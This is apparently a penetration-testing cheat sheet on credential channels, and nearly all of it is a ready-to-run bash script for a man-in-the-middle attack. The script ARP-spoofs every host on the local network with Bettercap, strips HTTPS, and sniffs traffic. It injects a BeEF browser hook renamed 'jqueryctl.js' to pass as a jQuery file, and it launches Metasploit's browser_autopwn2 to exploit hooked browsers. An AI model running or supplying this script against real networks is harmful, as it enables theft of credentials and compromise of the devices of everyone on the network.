# Credentials Encrypted Channel

## Check List

* [ ] _Identify sensitive information transmitted through the various channels._
* [ ] _Assess the privacy and security of the channels used._

## Cheat Sheet

### Man In The Middle

#### [BeEF ](https://beefproject.com/)& [Bettercap](https://www.bettercap.org/)

_Create Script_

```bash
sudo nano mitm-beef-bettercap.sh
```

```bash
#!/bin/bash

# --- Color Codes ---
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
CYAN='\e[1;36m'
RESET='\e[0m'

# --- Color Print Function ---
color_print() {
  local color=$1
  local msg=$2
  printf "${!color}%b${RESET}\n" "$msg"
}

# --- Root Check ---
if [[ "$(id -u)" -ne 0 ]]; then
  color_print RED "[X] Please run as ROOT..."
  exit 1
fi

# --- Tools Installer ---
for i in wget msfconsole beef-xss bettercap arp-scan; do
  if ! command -v "$i" &>/dev/null; then
    color_print RED "[X] $i NOT installed!"
    apt install -y $i
  fi
done

# --- Detect active interface ---
IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -1)
if [[ -z "$IFACE" ]]; then
  color_print RED "[X] Could not detect active interface. Exiting."
  exit 1
fi

# --- Get LAN IP ---
LAN=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
if [[ -z "$LAN" ]]; then
  color_print RED "[X] Could not detect LAN IP. Exiting."
  exit 1
fi

# --- Kill previous BeEF/Metasploit processes ---
pkill -f 'ngrok|ruby|msfconsole';wait

# --- Start Metasploit ---
color_print GREEN "[*] Starting Metasploit..."
msfconsole -qx "load msgrpc ServerHost=${LAN} Pass=abc123 SSL=y; use auxiliary/server/browser_autopwn2; set LHOST $LAN; set URIPATH /pwn; run -z" &>/dev/null &

# --- Configure BeEF ---
color_print GREEN "[*] Updating BeEF config..."
CONFIG_YAML="/usr/share/beef-xss/config.yaml"
METASPLOIT_YAML="/usr/share/beef-xss/extensions/metasploit/config.yaml"
AUTOPWN_YAML="/usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml"
EVASION_YAML="/usr/share/beef-xss/extensions/evasion/config.yaml"

# Main BeEF config
if grep -q 'https: false' "$CONFIG_YAML"; then
  sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
         -e 's|passwd: "beef"|passwd: "00980098"|g' \
         -e 's|# public:|public:|g' \
         -e 's|#     host: "" # public|     host: "'$LAN'" # public|' \
         -e 's|#     port: "" # public|     port: "443" # public|g' \
         -e 's|#     https: false|     https: true|g' \
         -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
         -e 's|hook.js|jqueryctl.js|g' \
         -e 's|BEEFHOOK|UNKSESSION|g' "$CONFIG_YAML"
else
  sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
         -e 's|passwd: "beef"|passwd: "00980098"|g' \
         -e 's|# public:|public:|g' \
         -e 's|host: ".*" # public|host: "'$LAN'" # public|' \
         -e 's|port: ".*" # public|port: "443" # public|g' \
         -e 's|https: false|https: true|g' \
         -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
         -e 's|hook.js|jqueryctl.js|g' \
         -e 's|BEEFHOOK|UNKSESSION|g' "$CONFIG_YAML"
fi

# Metasploit extension config
sed -i -e 's|enable: false|enable: true|g' \
       -e 's|host: ".*"|host: "'$LAN'"|g' \
       -e 's|callback_host: ".*"|callback_host: "'$LAN'"|g' \
       -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' "$METASPLOIT_YAML"

# Enable modules
sed -i -e 's|enable: false|enable: true|g' "$AUTOPWN_YAML"
sed -i -e 's|enable: false|enable: true|g' "$EVASION_YAML"

# --- Start BeEF ---
color_print GREEN "[*] Starting BeEF..."
cd /usr/share/beef-xss && ./beef -x &>/dev/null &

# --- Discover clients with netdiscover ---
color_print CYAN "[*] Scanning network ($IFACE) using arp-scan..."
LIVE_HOSTS=$(mktemp)
arp-scan --interface="$IFACE" --localnet --plain > "$LIVE_HOSTS"

# Filter IPs (remove gateway IP)
IPS=$(awk '{print $1}' "$LIVE_HOSTS" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v "$LAN" | paste -sd ',' -)

color_print GREEN "[*] Devices detected:"
awk '{printf "  IP: %-15s  MAC: %-18s\n", $1, $2}' "$LIVE_HOSTS"

# --- Final Info ---
color_print GREEN "[*] BeEF Panel: http://$LAN/ui/panel"
color_print GREEN "[*] BeEF USER: unk9vvn | PASS: 00980098"
color_print GREEN "[*] BeEF > Commands > Misc > Create Invisible Iframe > URL: http://$LAN:8080/pwn > Execute"

# --- Run Bettercap ---
color_print GREEN "[*] Starting Bettercap MITM attack..."

bettercap -iface "$IFACE" -eval "\
set arp.spoof.targets $IPS; \
set arp.spoof.internal true; \
set net.sniff.verbose true; \
set https.proxy.sslstrip true; \
set http.proxy.injectjs https://$LAN/jqueryctl.js; \
arp.spoof on; net.sniff on; https.proxy on"
```

_Run & Execute_

```bash
sudo chmod +x mitm-beef-bettercap.sh;sudo ./mitm-beef-bettercap.sh
```
